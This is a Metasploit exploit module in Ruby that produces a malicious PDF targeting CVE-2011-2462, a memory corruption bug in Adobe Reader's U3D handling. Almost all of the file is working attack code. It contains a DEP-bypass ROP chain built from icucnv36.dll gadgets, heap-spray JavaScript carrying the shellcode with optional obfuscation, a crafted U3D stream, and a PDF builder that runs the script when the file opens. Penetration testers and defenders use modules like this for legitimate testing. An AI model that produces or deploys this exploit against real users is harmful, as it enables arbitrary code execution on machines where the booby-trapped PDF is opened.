##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'zlib'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Adobe Reader U3D Memory Corruption Vulnerability',
			'Description'    => %q{
					This module exploits a vulnerability in the U3D handling within
				versions 9.x through 9.4.6 and 10 through to 10.1.1 of Adobe Reader.
				The vulnerability is due to the use of uninitialized memory.

				Arbitrary code execution is achieved by embedding specially crafted U3D
				data into a PDF document. A heap spray via JavaScript is used in order to
				ensure that the memory used by the invalid pointer issue is controlled.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'sinn3r',
					'juan vazquez',
					'jduck'
				],
			'References'     =>
				[
					[ 'CVE', '2011-2462' ],
					[ 'OSVDB', '77529' ],
					[ 'BID', '50922' ],
					[ 'URL', 'http://www.adobe.com/support/security/advisories/apsa11-04.html' ],
					[ 'URL', 'http://blog.vulnhunt.com/index.php/2011/12/12/cve-2011-2462-pdf-0day-analysis/' ],
					[ 'URL', 'http://blog.9bplus.com/analyzing-cve-2011-2462' ],
					[ 'URL', 'http://contagiodump.blogspot.com/2011/12/adobe-zero-day-cve-2011-2462.html' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space'         => 1000,
					'BadChars'      => "\x00",
					'DisableNops'   => true
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						# Adobe Reader 9.4.0 / XP SP3
						# Adobe Reader 9.4.5 / XP SP3
						# Adobe Reader 9.4.6 / XP SP3
						'Adobe Reader 9.4.0 / 9.4.5 / 9.4.6 on Win XP SP3',
						{
							# gadget from icucnv36:
							# mov ecx,dword ptr [eax+3Ch]
							# mov eax,dword ptr [ecx]
							# call dword ptr [eax+1Ch]
							'Ret' => 0x4a8453c3
						}
					],
				],
			'DisclosureDate' => 'Dec 06 2011', #Needs to be checked
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),
				OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])
			], self.class)

	end

	def junk(n=1)
		tmp = []
		value = rand_text(4).unpack("L")[0].to_i
		n.times { tmp << value }
		return tmp
	end

	def exploit
		# DEP bypass; uses icucnv36.dll
		stack_data = [
			junk,
			0x0c0c0c0c, # mapped at 0x0c0c0c0c # becomes edi after stackpivot
			0x0c0c0c0c, # becomes esi
			0x4a806f29, # pop edi / pop esi / pop ebp / ret 14h
			0x4a8a0000, # becomes edi
			0x4a802196, # becomes esi
			0x4a801f90, # becomes ebp
			0x4a806f29, # pop edi / pop esi / pop ebp / ret 14h
			0x4a806cef, # Stackpivot! xchg eax,esp (eax=0x0c0c0c0c) / xor al, al / pop edi / pop esi / ret # padding
			junk(4),
			0x00000000, # becomes edi
			0x00000002, # becomes esi
			0x00000102, # becomes ebp
			0x4a806f29, # pop edi / pop esi / pop ebp / ret 14h
			junk(5),
			0x4a80a8a6, # becomes edi
			0x4a801f90, # becomes esi
			0x4a849038, # becomes ebp
			0x4a8063a5, # pop ecx / ret
			junk(5),
			0x4a8a0000, # becomes ecx
			0x4a802196, # mov dword ptr [ecx],eax / ret # Stores eax (stack address)
			0x4a801f90, # pop eax / ret
			0x4a84903c, # becomes eax (import for CreateFileA)
			0x4a80b692, # jmp dword ptr [eax] {kernel32!CreateFileA}
			0x4a801064, # ret for CreateFileA # ret
			0x00000000, # __in      LPCTSTR lpFileName
			0x10000000, # __in      DWORD dwDesiredAccess
			0x00000000, # __in      DWORD dwShareMode
			0x00000000, # __in_opt  LPSECURITY_ATTRIBUTES lpSecurityAttributes
			0x00000002, # __in      DWORD dwCreationDisposition
			0x00000102, # __in      DWORD dwFlagsAndAttributes
			0x00000000, # __in_opt  HANDLE hTemplateFile
			0x4a8063a5, # pop ecx / ret
			0x4a801064, # becomes ecx
			0x4a842db2, # xchg eax, edi / ret
			0x4a802ab1, # pop ebx / ret
			0x00000008, # becomes ebx
			0x4a80a8a6, # and dword ptr [esp+ebx*2],edi (esp+ebx*2 = 0x0c0c0ce0, edi = {Result of CreateFileA}) / jne 4a80a8ae [br=1] / cmp al,2Fh / je 4a80a8ab [br=0] / cmp al,41h / jl 4a80a8ba [br=1] / cmp al,61h / jl 4a80a8c8) [br=1] / xor al,al / ret
			0x4a801f90, # pop eax / ret
			0x4a849038, # becomes eax (import for CreateFileA)
			0x4a80b692, # jmp dword ptr [eax] {kernel32!CreateFileMappingA}
			0x4a801064, # ret for CreateFileMappingA # ret
			0xffffffff, # __in      HANDLE hFile # mapped at 0c0c0ce0 => Stores Result of CreateFileA
			0x00000000, # __in_opt  LPSECURITY_ATTRIBUTES lpAttributes,
			0x00000040, # __in      DWORD flProtect,
			0x00000000, # __in      DWORD dwMaximumSizeHigh,
			0x00010000, # __in      DWORD dwMaximumSizeLow,
			0x00000000, # __in_opt  LPCTSTR lpName
			0x4a8063a5, # pop ecx / ret
			0x4a801064, # becomes ecx
			0x4a842db2, # xchg eax, edi / ret
			0x4a802ab1, # pop ebx / ret
			0x00000008, # becomes ebx
			0x4a80a8a6, # and dword ptr [esp+ebx*2],edi (esp+ebx*2 = 0x0c0c0d20, edi = {Result of FileMappingA}) / jne 4a80a8ae [br=1] / cmp al,2Fh / je 4a80a8ab [br=0] / cmp al,41h / jl 4a80a8ba [br=1] / cmp al,61h / jl 4a80a8c8) [br=1] / xor al,al / ret
			0x4a801f90, # pop eax / ret
			0x4a849030, # becomes eax (import for kernel32!MapViewOfFile)
			0x4a80b692, # jmp dword ptr [eax] {kernel32!MapViewOfFile}
			0x4a801064, # ret for MapViewOfFile # ret
			0xffffffff, # __in  HANDLE hFileMappingObject # mapped at 0x0c0c0d20 => {Result of FileMappingA}
			0x00000022, # __in  DWORD dwDesiredAccess
			0x00000000, # __in  DWORD dwFileOffsetHigh
			0x00000000, # __in  DWORD dwFileOffsetLow
			0x00010000, # __in  SIZE_T dwNumberOfBytesToMap
			0x4a8063a5, # pop ecx / ret
			0x4a8a0004, # becomes ecx
			0x4a802196, # mov dword ptr [ecx],eax / ret # Stores result of MapViewOfFile
			0x4a8063a5, # pop ecx / ret
			0x4a801064, # becomes ecx
			0x4a842db2, # xchg eax, edi / ret
			0x4a802ab1, # pop ebx / ret
			0x00000030, # becomes ebx
			0x4a80a8a6, # and dword ptr [esp+ebx*2],edi (esp+ebx*2 = 0c0c0db8, edi = {Result of MapViewOfFile} / jne 4a80a8ae [br=1] / cmp al,2Fh / je 4a80a8ab [br=0] / cmp al,41h / jl 4a80a8ba [br=1] / cmp al,61h / jl 4a80a8c8) [br=1] / xor al,al / ret
			0x4a801f90, # pop eax / ret
			0x4a8a0004, # becomes eax {Result of MapViewOfFile}
			0x4a80a7d8, # mov eax,dword ptr [eax] / ret
			0x4a8063a5, # pop ecx / ret
			0x4a801064, # becomes ecx
			0x4a842db2, # xchg eax, edi / ret
			0x4a802ab1, # pop ebx / ret
			0x00000020, # becomes ebx
			0x4a80a8a6, # and dword ptr [esp+ebx*2],edi (esp+ebx*2 = 0c0c0dbc, edi = {Result of MapViewOfFile} / jne 4a80a8ae [br=1] / cmp al,2Fh / je 4a80a8ab [br=0] / cmp al,41h / jl 4a80a8ba [br=1] / cmp al,61h / jl 4a80a8c8) [br=1] / xor al,al / ret
			0x4a8063a5, # pop ecx / ret
			0x4a801064, # becomes ecx
			0x4a80aedc, # lea edx,[esp+0Ch] (edx => 0c0c0d94) / push edx {0c0c0d94} / push eax {Result of MapViewOfFile} / push dword ptr [esp+0Ch] ([0c0c0d8c] => 0x34) / push dword ptr [4a8a093c] ([4a8a093c] = 0x0) / call ecx (u 0x4a801064 => ret) / add esp, 10h / ret
			0x4a801f90, # pop eax / ret
			0x00000034, # becomes eax # mapped at 0c0c0d8c
			0x4a80d585, # add eax, edx / ret (eax => 0c0c0dc8 => shellcode after ROP chain)
			0x4a8063a5, # pop ecx / ret # mapped at 0c0c0d94
			0x4a801064, # becomes ecx
			0x4a842db2, # xchg eax,edi (edi becomes 0c0c0d8c, eax becomes Result of MapViewOfFile) / ret
			0x4a802ab1, # pop ebx / ret
			0x0000000a, # becomes ebx
			0x4a80a8a6, # and dword ptr [esp+ebx*2],edi (esp+ebx*2 = 0c0c0dc0, edi = {shellcode after ROP chain} / jne 4a80a8ae [br=1] / cmp al,2Fh / je 4a80a8ab [br=0] / cmp al,41h / jl 4a80a8ba [br=1] / cmp al,61h / jl 4a80a8c8) [br=1] / xor al,al / ret
			0x4a801f90, # pop eax / ret
			0x4a849170, # becomes eax (import for MSVCR80!memcpy)
			0x4a80b692, # jmp dword ptr [eax] {MSVCR80!memcpy}
			0xffffffff, # ret for memcpy # mapped at 0c0c0db8 => Result of MapViewOfFile
			0xffffffff, # dst (memcpy param) # mapped at 0c0c0dbc => Result of MapViewOfFile
			0xffffffff, # src (memcpy param) # mapped at 0c0c0dc0 => Address of shellcode after ROP chain
			0x00001000  # length (memcpy param)
		].flatten.pack('V*')

		payload_buf = ''
		payload_buf << stack_data
		payload_buf << payload.encoded
		escaped_payload = Rex::Text.to_unescape(payload_buf)

		eip_ptr =
		[
			junk(3),
			target.ret, # EIP
			junk(7),
			0x0c0c0c0c, # [eax+3Ch] => becomes ecx / [0x0c0c0c0c] = 0x0c0c0c0c / [0x0c0c0c0c+1Ch] = 4a806cef => stackpivot
			junk(16),
		].flatten.pack('V*')

		escaped_eip = Rex::Text.to_unescape(eip_ptr)

		js = <<-JS

		var padding;
		var bbb, ccc, ddd, eee, fff, ggg, hhh;
		var pointers_a, i;
		var x = new Array();
		var y = new Array();

		function alloc(bytes) {
			return padding.substr(0, (bytes - 6) / 2);
		}

		function spray_eip(esc_a) {
			pointers_a = unescape(esc_a);
			for (i = 0; i < 2000; i++) {
				x[i] = alloc(0x8) + pointers_a;
				y[i] = alloc(0x88) + pointers_a;
				y[i] = alloc(0x88) + pointers_a;
				y[i] = alloc(0x88) + pointers_a;
			}
		};

		function spray_shellcode() {
			bbb = unescape('#{escaped_payload}');
			ccc = unescape("%u0c0c");
			ccc += ccc;

			while (ccc.length + 20 + 8 < (0x8000 + 0x8000)) ccc += ccc;

			i1 = 0x0c0c - 0x24;
			ddd = ccc.substring(0, i1 / 2);

			ddd += bbb;
			ddd += ccc;

			i2 = 0x4000 + 0xc000;
			eee = ddd.substring(0, i2 / 2);

			for (; eee.length < 0x40000 + 0x40000;) eee += eee;

			i3 = (0x1020 - 0x08) / 2;
			fff = eee.substring(0, 0x80000 - i3);

			ggg = new Array();

			for (hhh = 0; hhh < 0x1e0 + 0x10; hhh++) ggg[hhh] = fff + "s";
		}

		padding = unescape("#{escaped_eip}");
		while (padding.length < 0x10000)
		padding = padding + padding;

		spray_shellcode();
		spray_eip('%u4141');

		this.pageNum = 2;
		JS

		js = js.gsub(/^\t\t/,'')

		if datastore['OBFUSCATE']
			js = ::Rex::Exploitation::JSObfu.new(js)
			js.obfuscate
		end

		u3d = make_u3d_stream
		xml = make_xml_data
		pdf = make_pdf(u3d, xml, js.to_s)
		print_status("Creating '#{datastore['FILENAME']}' file...")
		file_create(pdf)
	end

	def make_xml_data
		xml = %Q|<?xml version="1.0" encoding="UTF-8"?>
		<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
		<ed>kapa</ed>
		<config xmclns="http://www.microsoft.org/schema/xci/2.6/">
		<present>
		<pdf>
		<version>1</version>
		<fjdklsajfodpsajfopjdsio>f</fjdklsajfodpsajfopjdsio>
		<interactive>1</interactive>
		</pdf>
		</present>
		</config>
		<template xmdfaflns="http://www.microsoft.org/schema/xffdsa-template/2f/">
		<subform name="form1" layout="tb" locale="en_US">
		<pageSet>
		</pageSet>
		</subform>
		</template>
		<template1 xmdfaflns="http://www.microsoft.org/schema/xffdsa-template/2f/">
		<subform name="form1" layout="tb" locale="en_US">
		<pageSet>
		</pageSet>
		</subform>
		</template1>
		<template2 xmdfaflns="http://www.microsoft.org/schema/xffdsa-template/2f/">
		<subform name="form1" layout="tb" locale="en_US">
		<pageSet>
		</pageSet>
		</subform>
		</template2>
		</xdp:xdp>|

		xml = xml.gsub(/^\t\t/, '')
		return xml
	end

   def u3d_pad(str, char="\x00")
		len = str.length % 4
		if (len > 0)
			#puts "Adding %d pad bytes" % (4 - len)
			return (char * (4 - len))
		end
		""
	end

	def u3d_string(str)
		([str.length].pack('v') + str)
	end

	def make_u3d_stream()
		#
		# REFERENCE:
		# http://www.ecma-international.org/publications/files/ECMA-ST/ECMA-363%201st%20edition.pdf
		# The File format consists of these blocks:
		# [File Header Block][Declaration Block][Continuation Block]
		# Each block consists of (padding is used to keep fields 32-bit aligned):
		# [Block Type][Data Size][Metadata Size][Data][Data Padding][Meta Data][Meta Data Padding]
		#
		mc_name = u3d_string("CCCCBox01")
		mr_name = u3d_string("Box01RX")

		# build the U3D header (length will be patched in later)
		hdr_data = [0,0].pack('n*') # version info
		hdr_data << [0,0x24,0xa34,0,0x6a].pack('VVVVV') # 31337 was 0xa34

		hdr = "U3D\x00"
		hdr << [hdr_data.length,0].pack('VV')
		hdr << hdr_data

		parent_node_data =
			"\x01\x00\x00\x00"+ # node count (1)
			"\x00\x00"+         # name (empty)
			# transform matrix
			[0x813f,0,0,0,0,0x813f,0,0,0,0,0x813f,0,0x548a55c0,0xa2027cc2,0,0x813f].pack('N*')


		model_node_data = ""
		model_node_data << mc_name
		model_node_data << parent_node_data
		model_node_data << mr_name
		model_node_data << [1].pack('V') # Model Visibility (Front visible)
		model_node = [0xffffff22,model_node_data.length,0].pack('VVV')
		#model_node = [0xffffff22,0x5e,0].pack('VVV')
		model_node << model_node_data

		bone_weight_data = ""
		bone_weight_data << mc_name
		bone_weight_data << [
			1,          # Chain index
			1,          # Bone Weight Attributes (for a mesh)
			0x3162123b, # Inverse Quant
			0x14,       # Position Count
		].pack('VVNV')
		# Position List
		bone_weight_data << [
			# 1
			1,          # Bone Weight Count
			3,          # Bone Index (no Quantized Weight)
			# 2
			0x55550000, # Bone Weight Count
			0x4c1df36e, # Bone Index 
			0x0200d002, # Quantized Weight
			# 3
			0x95000074, # Bone Weight Count
			0x66ccc357, # Bone Index
			0x00000000  # Quantized Weight
		].pack('VVNNNNNN')
		bone_weight = [0xffffff44,0x3a,0].pack('VVV')
		# We hardcode the length to match the old file.. (TODO: test if necessary)
		#bone_weight = [0xffffff44,bone_weight_data.length,0].pack('VVV')
		bone_weight << bone_weight_data

		new_objtype1_data = 
			"\x05\x00\x52\x52\x52\x52\x52\x01\x00\x00\x00\xa6\x04\xa8\x96\xb9\x3f\xc5\x43\xb2\xdf\x2a"+
			"\x31\xb5\x56\x93\x40\x00\x01\x00\x00\x00\x00\x00\x00\x05\x00\x52\x52\x52\x52\x52\x01\x00"+
			"\x00\x00\x01\x00\x2e\x01\x00\x76\x00\x00\x00\x00"
		#new_objtype1 = [0xffffff16,0x38,0].pack('VVV')
		new_objtype1 = [0xffffff16,new_objtype1_data.length,0].pack('VVV')
		new_objtype1 << new_objtype1_data

		shading_modifier_data = ""
		shading_modifier_data << mc_name
		shading_modifier_data <<
			"\x02\x00\x00\x00\x00\x00\x00\x00\x01"+
			"\x00\x00\x00\x00\x00\x00\x00\x06\x00\x42\x6f\x02\x00\x00\x00"
		#shading_modifier = [0xffffff45,0x23,0].pack('VVV')
		shading_modifier = [0xffffff45,shading_modifier_data.length,0].pack('VVV')
		shading_modifier << shading_modifier_data

		new_objtype2_data =
			"\x01\x00\x52\x01\x00\x00\x00\xa6\x04\xa8\x96\xb9\x3f\xc5\x43\xb2"+
			"\xdf\x2a\x31\xb5\x56\x93\x40\x00\x01\x00\x00\x00\x00\x00\x00\x01\x00\x52\x01\x00\x00\x00"+
			"\x01\x00\x2e\x01\x00\x76\x00\x00\x00\x00"
		#new_objtype2 = [0xffffff16,0x30,0].pack('VVV')
		new_objtype2 = [0xffffff16,new_objtype2_data.length,0].pack('VVV')
		new_objtype2 << new_objtype2_data

		nodemod_decl = ""
		nodemod_decl << model_node
		nodemod_decl << u3d_pad(nodemod_decl)
		nodemod_decl << bone_weight
		nodemod_decl << u3d_pad(nodemod_decl)
		nodemod_decl << new_objtype1
		nodemod_decl << u3d_pad(nodemod_decl)
		nodemod_decl << shading_modifier
		nodemod_decl << u3d_pad(nodemod_decl)
		nodemod_decl << new_objtype2
		nodemod_decl << u3d_pad(nodemod_decl)

		nodemod_decl <<
		# another modifier chain?
		"\x14\xff\xff\xff\xc0\x01\x00\x00\x00\x00\x00\x00"+
		"\x07\x00\x42\x6f\x78\x30\x31\x52\x58\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00"+
		"\x00\x00"+
		# clod mesh generator (declaration)
		"\x31\xff\xff\xff\x9b\x01\x00\x00\x00\x00\x00\x00\x07\x00\x42\x6f\x78\x30\x31\x52"+
		"\x58\x00\x00\x00\x00\x00\x00\x00\x00\x24\x00\x00\x00\x14\x00\x00\x00\x6c\x00\x00\x00\x00"+
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x2c\x01\x00\x00\x2c\x01\x00\x00\x2c"+
		"\x01\x00\x00\x87\x52\x0a\x3d\xa6\x05\x6f\x3b\xa6\x05\x6f\x3b\x4a\xf5\x2d\x3c\x4a\xf5\x2d"+
		"\x3c\x66\x66\x66\x3f\x00\x00\x00\x3f\xf6\x28\x7c\x3f\x04\x00\x00\x00\x07\x00\x53\x63\x61"+
		"\x70\x75\x6c\x61\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
		"\x07\x00\x48\x75\x6d\x65\x72\x75\x73\x07\x00\x53\x63\x61\x70\x75\x6c\x61\x00\x00\x00\x00"+
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x55\x6c\x6e\x61\x07\x00\x48\x75"+
		"\x6d\x65\x72\x75\x73\x00\x00\x00\x00\x00\x00\x20\x41\x00\x00\x00\x00\x00\x00\x20\x41\x00"+
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06"+
		"\x00\x52\x61\x64\x69\x75\x73\x04\x00\x55\x6c\x6e\x61\x00\x00\x00\x00\x00\x00\x70\x41\x00"+
		"\x00\x00\x00\x00\x00\x70\x41\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
		"\x00\x00\x00\x00\x00\x00\x00\x00"+
		# clod mesh generator (progressive mesh cont)
		"\x3c\xff\xff\xff\x6f\x01\x00\x00\x00\x00\x00\x00\x07\x00"+
		"\x42\x6f\x78\x30\x31\x52\x58\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00"+
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x94\x00\x00\x00\x50\x02\x00\x00\x28\x01"+
		"\x00\x00\x7f\x75\x2f\x2b\x00\x00\x20\x73\x00\x00\xc3\x05\x00\x00\x00\x00\x00\x00\x80\x02"+
		"\x45\xe4\x4c\x55\x01\x00\x00\xe0\x30\x03\x00\x00\xb0\x01\x00\x00\x00\x36\x00\x00\x00\x00"+
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x55\x55\x05\x00\x80\xa3\x2a\x00\xc0\xe1"+
		"\x41\x6b\x92\xf2\xa4\x00\x00\x72\x87\x18\x4c\xd0\xda\x00\x00\x20\x46\xa9\x03\x00\x40\x8c"+
		"\x00\x00\xa0\x7c\xa9\xa7\x10\x03\x00\x00\xc4\x09\x00\x00\x0d\xd2\x50\x85\x03\x72\x00\x80"+
		"\x5c\x37\x19\xc1\xb9\x0f\x00\x20\x55\xf7\x13\x00\x40\x00\xdc\x1f\xf9\x2c\x35\x30\x6e\x06"+
		"\x62\xb6\xea\x09\x2e\x7b\x28\xa4\x90\xe0\xb3\x63\x2c\x20\x92\x2a\x88\xbc\x06\x3a\xff\x80"+
		"\x43\xb2\x00\x00\x00\x14\x62\x0e\x63\xb4\x04\x08\x47\x52\x20\x31\xca\x00\x00\xb4\x21\xe0"+
		"\xd7\x01\x00\xa0\x1a\x72\x11\x71\xc2\x2c\x74\xc1\xa3\x56\xfa\x30\x03\x00\xe0\x7b\xd0\x62"+
		"\x2a\x00\x40\x71\xfa\x6c\xc6\xcf\x07\x78\x81\xd0\x47\x3d\x58\x0e\x51\x0f\x2e\x27\x2d\xbe"+
		"\x26\x10\x06\x6f\x3a\x40\xae\x36\x6a\x43\x60\xdf\xcb\xef\x8c\x38\xca\x04\x92\x79\x4b\x79"+
		"\xe9\x42\xbd\x2b\xb9\x5b\x86\x60\x65\xa4\x75\x01\x19\xda\xcf\x6a\xf7\x2a\x77\x3c\xde\xf1"+
		"\x11\x75\x33\xd3\x94\x74\x4a\x14\x73\x4b\x18\xa1\x66\xc2\x0f\xde\x3d\xed\x19\xd4\x32\x2e"+
		"\xb6\x11\xf2\xc6\x2f\x13\x62\xb9\xe5\xe1\x03\x8b\xb5\x1c\x23\x9f\x80\x03\x75\xb6\x26\xd3"+
		"\x1c\x16\x5f\x9b\x3c\xea\x62\x10\xe1\xb1\x00\x00\x00\x00"

		# build the modifier chain
		chain_data = ""
		chain_data << mc_name
		chain_data << [0].pack('V') # type (node modifier)
		chain_data << [0].pack('V') # attributes (no bounding info)
		chain_data << u3d_pad(chain_data)
		chain_data << [0x5].pack('V') # number of modifiers
		chain_data << nodemod_decl
		#modifier_chain = [0xffffff14,chain_data.length,0].pack('VVV') # chain_data was 0x17c bytes
		modifier_chain = [0xffffff14,0x17c,0].pack('VVV')
		modifier_chain << chain_data

		data = ""
		data << hdr
		data << modifier_chain

		data
	end

	def RandomNonASCIIString(count)
		result = ""
		count.times do
			result << (rand(128) + 128).chr
		end
		result
	end

	def ioDef(id)
		"%d 0 obj\n" % id
	end

	def ioRef(id)
		"%d 0 R" % id
	end

	def ASCIIHexWhitespaceEncode(str)
		result = ""
		whitespace = ""
		str.each_byte do |b|
			result << whitespace << "%02x" % b
			whitespace = " " * (rand(3) + 1)
		end
		result << ">"
	end

	def make_pdf(u3d_stream, xml, js_doc)
		xref = []
		eol = "\x0a"
		obj_end = "" << eol << "endobj" << eol

		# the header
		pdf = "%PDF-1.7" << eol

		# filename/comment
		pdf << "%" << RandomNonASCIIString(4) << eol

		email = rand_text_alpha(3) + "@" + rand_text_alpha(4) + ".com"
		site  = rand_text_alpha(5) + ".com"
		xref << pdf.length
		pdf << ioDef(1)
		pdf << "<</Author (Fo)/email (#{email})/web (site)>>"
		pdf << obj_end

		compressed_xml = Zlib::Deflate.deflate(xml)
		xref << pdf.length
		pdf << ioDef(2)
		pdf << "<</Length " << compressed_xml.length.to_s << " /Filter /FlateDecode>>" << eol
		pdf << "stream" << eol
		pdf << compressed_xml << eol
		pdf << "endstream"
		pdf << obj_end

		xref << pdf.length
		pdf << ioDef(3)
		pdf << "<</XFA " << ioRef(2) << ">>"
		pdf << obj_end

		xref << pdf.length
		pdf << ioDef(4)
		pdf << "<</Type/Catalog/Outlines " << ioRef(5)
		pdf << " /Pages " << ioRef(6)
		pdf << " /OpenAction " << ioRef(14)
		pdf << " /AcroForm " << ioRef(3)
		pdf << ">>"
		pdf << obj_end

		xref << pdf.length
		pdf << ioDef(5) << "<</Type/Outlines/Count 0>>"
		pdf << obj_end

		xref << pdf.length
		pdf << ioDef(6)
		pdf << "<</Type/Pages/Count 3/Kids [%s %s %s]>>" % [ioRef(13), ioRef(9), ioRef(12)]
		pdf << obj_end

		data = "\x78\xda\xd3\x70\x4c\x04\x02\x4d\x85\x90\x2c\x00\x0f\xd3\x02\xf5"
		compressed_data = Zlib::Deflate.deflate(data)
		xref << pdf.length
		pdf << ioDef(7)
		pdf << "<</Length %s /Filter /FlateDecode>>" %compressed_data.length.to_s << eol
		pdf << "stream" << eol
		pdf << compressed_data << eol
		pdf << "endstream"
		pdf << obj_end

		xref << pdf.length
		pdf << ioDef(8)
		pdf << "<</ProcSet [/PDF]>>"
		pdf << obj_end

		xref << pdf.length
		pdf << ioDef(9)
		pdf << "<</Type/Page/Parent %s/MediaBox [0 0 640 480]/Contents %s/Resources %s>>" % [ioRef(6), ioRef(7), ioRef(8)]
		pdf << obj_end

		compressed_u3d = Zlib::Deflate::deflate(u3d_stream)
		xref << pdf.length
		pdf << ioDef(10)
		pdf << "<</Type/3D/Subtype/U3D/Length %s /Filter/FlateDecode>>" %compressed_u3d.length.to_s << eol
		pdf << "stream" << eol
		pdf << compressed_u3d << eol
		pdf << "endstream"
		pdf << obj_end

		xref << pdf.length
		pdf << ioDef(11)
		pdf << "<</Type/Annot/Subtype/3D/Contents (#{rand_text_alpha(4)})/3DI false/3DA <</A/PO/DIS/I>>"
		pdf << "/Rect [0 0 640 480]/3DD %s /F 7>>" %ioRef(10)
		pdf << obj_end

		xref << pdf.length
		pdf << ioDef(12)
		pdf << "<</Type/Page/Parent %s /MediaBox [0 0 640 480]/Contents %s /Resources %s /Annots [%s]>>" % [ioRef(6), ioRef(7), ioRef(8), ioRef(11)]
		pdf << obj_end

		xref << pdf.length
		pdf << ioDef(13)
		pdf << "<</Type/Page/Parent %s /MediaBox [0 0 640 480]/Contents %s /Resources %s>>" % [ioRef(6), ioRef(7), ioRef(8)]
		pdf << obj_end

		xref << pdf.length
		pdf << ioDef(14)
		pdf << "<</S/JavaScript/JS %s>>" %ioRef(15)
		pdf << obj_end

		compressed_js = Zlib::Deflate.deflate(ASCIIHexWhitespaceEncode(js_doc))
		xref << pdf.length
		pdf << ioDef(15)
		pdf << "<</Length " <<  compressed_js.length.to_s << " /Filter [/FlateDecode/ASCIIHexDecode]>>"
		pdf << "stream" << eol
		pdf << compressed_js << eol
		pdf << "endstream"
		pdf << obj_end

		# xrefs
		xrefPosition = pdf.length
		pdf << "xref" << eol
		pdf << "0 %d" % (xref.length + 1) << eol
		pdf << "0000000000 65535 f" << eol
		xref.each do |index|
			pdf << "%010d 00000 n" % index << eol
		end

		# trailer
		pdf << "trailer" << eol
		pdf << "<</Size %d/Root " % (xref.length + 1) << ioRef(4) << ">>" << eol
		pdf << "startxref" << eol
		pdf << xrefPosition.to_s() << eol
		pdf << "%%EOF" << eol
	end

end